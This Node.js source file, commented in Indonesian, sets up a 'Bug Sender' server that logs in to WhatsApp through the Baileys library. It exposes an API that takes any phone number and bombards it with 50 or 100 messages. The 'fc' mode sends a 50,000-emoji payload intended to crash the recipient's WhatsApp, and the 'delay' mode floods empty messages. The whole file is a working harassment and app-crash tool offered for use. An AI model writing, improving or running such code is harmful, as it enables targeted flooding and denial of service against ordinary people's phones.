// ============================================
// SERVER BUG SENDER - Node.js + Baileys
// ============================================
const express = require('express');
const cors = require('cors');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const qrcode = require('qrcode-terminal');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

let sock = null;
let isConnected = false;

// ============ KONEKSI WHATSAPP ============
async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ['Bug Sender', 'Chrome', '1.0.0']
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            console.log('\n📱 SCAN QR CODE INI DENGAN WHATSAPP KAMU:\n');
            qrcode.generate(qr, { small: true });
        }

        if (connection === 'close') {
            isConnected = false;
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('❌ Koneksi terputus. Reconnect:', shouldReconnect);
            if (shouldReconnect) setTimeout(connectToWhatsApp, 5000);
        } else if (connection === 'open') {
            isConnected = true;
            console.log('\n✅ WhatsApp BERHASIL TERHUBUNG!\n');
        }
    });
}

connectToWhatsApp();

// ============ FUNGSI SPAM/BUG ============
async function sendBug(jid, type, sender) {
    if (!isConnected || !sock) {
        throw new Error('WhatsApp belum terhubung. Scan QR dulu di logs.');
    }

    const iterations = sender === 'global' ? 100 : 50;
    const delayMs = type === 'delay' ? 100 : 0;
    const payload = '🕷️'.repeat(50000);

    console.log(`🚀 Mengirim ${iterations}x bug ${type} ke ${jid}...`);

    for (let i = 0; i < iterations; i++) {
        try {
            if (type === 'delay') {
                await sock.sendMessage(jid, { text: '' });
            } else if (type === 'fc') {
                await sock.sendMessage(jid, { text: payload });
            }

            if (delayMs > 0) await new Promise(r => setTimeout(r, delayMs));
            if ((i + 1) % 10 === 0) console.log(`   → ${i + 1}/${iterations} terkirim`);
        } catch (err) {
            console.log(`   ⚠️ Error di iterasi ${i + 1}: ${err.message}`);
        }
    }

    return iterations;
}

// ============ API ENDPOINT ============
app.post('/api/send-bug', async (req, res) => {
    const { target, bug_type, sender } = req.body;

    if (!target || !bug_type || !sender) {
        return res.status(400).json({ success: false, message: 'Data tidak lengkap!' });
    }

    let cleanNumber = target.replace(/[^0-9]/g, '');
    if (cleanNumber.startsWith('0')) cleanNumber = '62' + cleanNumber.slice(1);
    const jid = `${cleanNumber}@s.whatsapp.net`;

    try {
        if (!isConnected || !sock) {
            return res.status(503).json({ success: false, message: 'WhatsApp belum terhubung. Cek logs untuk QR.' });
        }

        const [result] = await sock.onWhatsApp(jid);
        if (!result?.exists) {
            return res.status(404).json({ success: false, message: 'Nomor tidak terdaftar di WhatsApp!' });
        }

        const total = await sendBug(result.jid, bug_type, sender);

        res.json({
            success: true,
            message: `${total} bug berhasil dikirim ke ${target}!`,
            total: total
        });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Cek status koneksi
app.get('/api/status', (req, res) => {
    res.json({ connected: isConnected });
});

// ============ START SERVER ============
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n🌐 Server berjalan di port ${PORT}`);
    console.log(`📱 Tunggu QR code muncul di bawah...\n`);
});
